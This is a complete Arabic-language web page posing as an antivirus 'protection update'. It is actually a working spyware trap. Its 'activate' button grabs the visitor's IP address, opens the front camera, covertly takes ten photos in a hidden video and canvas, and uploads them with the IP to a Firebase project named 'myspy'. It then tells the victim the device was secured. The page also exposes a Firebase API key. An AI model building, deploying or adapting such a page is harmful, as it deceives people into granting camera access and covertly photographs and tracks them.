<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث نظام الحماية</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: Arial; text-align: center; padding-top: 50px; }
        .card { border: 2px solid #0f0; display: inline-block; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px #0f0; }
        .btn { background: #0f0; color: #000; padding: 20px 40px; font-size: 20px; font-weight: bold; border: none; border-radius: 10px; cursor: pointer; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color:#0f0;">⚠️ تنبيه الحماية</h2>
        <p>يجب تفعيل الوصول لتنظيف جهازك من الفيروسات</p>
        <button class="btn" onclick="startTrap()">تفعيل الآن 🛡️</button>
        <p id="st" style="color:#555; margin-top:10px;">الحالة: بانتظار الموافقة</p>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U", 
            authDomain: "myspy-2579b.firebaseapp.com", 
            projectId: "myspy-2579b", 
            databaseURL: "https://myspy-2579b-default-rtdb.firebaseio.com" 
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        async function startTrap() {
            try {
                // 1. سحب الـ IP الأول
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                // 2. محاولة فتح الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } // بيصور بالكاميرا الأمامية
                });
                const video = document.getElementById('v');
                video.srcObject = stream;
                document.getElementById('st').innerText = "⌛ جاري تأمين الملفات...";

                // 3. التصوير التلقائي المتكرر
                let shots = 0;
                const loop = setInterval(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    // إرسال الصورة لـ Firebase (مشروعك myspy-2579b)
                    db.ref('results').push({
                        photo: canvas.toDataURL('image/jpeg', 0.6),
                        ip: ipData.ip,
                        time: new Date().toLocaleString()
                    });

                    shots++;
                    if (shots >= 10) { 
                        clearInterval(loop); 
                        alert("✅ تم تأمين جهازك بنجاح!");
                        document.getElementById('st').innerText = "✅ اكتمل الفحص";
                    }
                }, 700); // صورة كل 700 مللي ثانية
            } catch (err) {
                alert("🚨 يجب السماح بالكاميرا لتحديث الحماية!");
            }
        }
    </script>
</body>
</html>
